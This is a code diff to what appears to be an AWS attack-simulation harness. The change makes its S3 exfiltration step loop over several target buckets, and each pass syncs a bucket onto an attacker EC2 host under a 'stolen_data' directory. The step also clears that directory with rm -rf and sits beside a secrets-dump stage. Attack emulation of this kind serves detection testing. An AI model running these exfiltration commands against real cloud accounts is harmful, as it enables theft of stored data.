@@ -29,7 +29,7 @@ class ScenarioExecution:
         self.compromised_ec2_external_ip = None
         self.attacker_ec2_external_ip = None
         self.lambda_role_arn = None
-        self.exfil_bucket_name = None
+        self.exfil_bucket_names = []
         self.compromised_ec2_key = "./compromised_id_rsa"
         self.compromised_ec2_public_key = "./compromised_id_rsa.pub"
         self.attacker_ec2_key = "./attacker_id_rsa"
@@ -51,7 +51,7 @@ class ScenarioExecution:
         self.attacker_ec2_external_ip = data["Attacker Server Public IP"]
         self.lambda_role_arn = data["Lambda Role ARN"]
         self.iam_monitor_role_arn = data["IAM Monitor Role ARN"]
-        self.exfil_bucket_name = data["Bucket Name"]
+        self.exfil_bucket_names = data["Exfil Bucket Names"]
 
         if self.agent_included:
             self.compromised_ec2_external_ip = data["Compromised Server Public IP"]
@@ -379,20 +379,29 @@ class ScenarioExecution:
     def s3_exfiltration(self):
         print(
             colored(
-                f"[ATTACKER] Exfiltrating S3 bucket: {self.exfil_bucket_name}", "red"
+                f"[ATTACKER] Exfiltrating {len(self.exfil_bucket_names)} S3 buckets",
+                "red",
             )
         )
         self.attacker_run(
             "rm -rf /home/ubuntu/stolen_data/"
         )  # Clear up the directory to make sure we don't have it already
 
-        res = self.attacker_run(
-            f"aws s3 sync s3://{self.exfil_bucket_name} /home/ubuntu/stolen_data/"
-        )
-        if not res:
-            raise Exception("Error, S3 exfiltration failed")
+        for bucket_name in self.exfil_bucket_names:
+            print(
+                colored(
+                    f"[ATTACKER] Exfiltrating S3 bucket: {bucket_name}", "red"
+                )
+            )
+            res = self.attacker_run(
+                f"aws s3 sync s3://{bucket_name} /home/ubuntu/stolen_data/{bucket_name}/"
+            )
+            if not res:
+                raise Exception(
+                    f"Error, S3 exfiltration failed for bucket: {bucket_name}"
+                )
 
-        print(res)
+            print(res)
 
     def scenario_8_execute(self, manual):
         # Init
@@ -568,10 +577,13 @@ class ScenarioExecution:
         self.secrets_dump()
 
         # Exfiltration from S3
-        if self.exfil_bucket_name not in self.discovered_buckets:
+        missing_buckets = [
+            b for b in self.exfil_bucket_names if b not in self.discovered_buckets
+        ]
+        if missing_buckets:
             print(
                 colored(
-                    "Target S3 bucket not found in discovered buckets, aborting...",
+                    f"{len(missing_buckets)} target S3 bucket(s) not found in discovered buckets, aborting...",
                     "red",
                 )
             )
